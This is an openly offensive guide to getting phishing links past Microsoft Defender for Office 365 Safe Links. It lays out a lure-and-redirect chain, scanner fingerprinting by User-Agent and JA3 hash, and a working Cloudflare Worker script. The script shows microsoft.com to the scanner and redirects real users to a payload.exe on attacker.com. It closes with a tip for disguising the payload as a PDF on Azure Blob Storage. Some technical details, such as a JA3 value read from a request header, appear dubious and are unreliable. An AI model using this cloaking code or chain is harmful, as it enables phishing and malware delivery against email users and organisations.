Weaponising a redirector chain against Microsoft Defender for Office 365 (formerly Office 365 Advanced Threat Protection – Safe Links) requires a multi-stage bypass that exploits (1) detonation latency windows, (2) URL parsers’ inconsistent domain resolution paths, and (3) conditional 302 redirects based on client fingerprinting.

Mechanism
1.  Initial phishing lure: HTML email with anchor text pointing to https://bit.ly/3P8JQ4z.
2.  Bit.ly URL shortener expands to a dummy domain victim.com/redir (controlled by attacker).
3.  Microsoft’s Safe Links proxy (URLP) first resolves victim.com and detonates the redirect URL; if the destination resolves to an IP or suspicious port, the link is blocked.
4.  The bypass vector exploits Safe Links’ 5-second DNS resolution timeout: if DNS response is delayed >5 s, Safe Links marks the URL as “pending detonation.”
5.  Conditional redirect: attacker sets up a Cloudflare Worker at victim.com/redir that fingerprints the incoming URLP request via:
   • User-Agent header (Safe Links → User-Agent contains “Microsoft Office/16.0”).
   • TLS JA3 fingerprint (URLP uses curl/7.68 → JA3 hash 7f16c6b47956d54895a3ce3fca0a796d).
6.  If fingerprint matches Safe Links, the worker returns a 302 redirect to a benign Microsoft domain (e.g., microsoft.com/en-us/edge) → bypass.
7.  If fingerprint is absent (real user), the worker follows a second path that returns a 302 redirect to a malicious domain (e.g., attacker.com/dl) hosting the payload.

Tools & commands
```
# Cloudflare Worker script
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})
async function handleRequest(request) {
  const ua = request.headers.get("User-Agent") || "";
  const ja3 = request.headers.get("JA3") || "";
  if (ua.includes("Microsoft Office") && ja3.includes("7f16c6b")) {
    return new Response("", {status: 302, headers: {"Location": "https://www.microsoft.com/en-us/edge"}})
  } else {
    return new Response("", {status: 302, headers: {"Location": "https://attacker.com/dl/payload.exe"}})
  }
}
```
Additional bypass layer: payload hosted via Azure Blob Storage renamed to “report.pdf” with Content-Disposition: attachment → bypasses mime-type
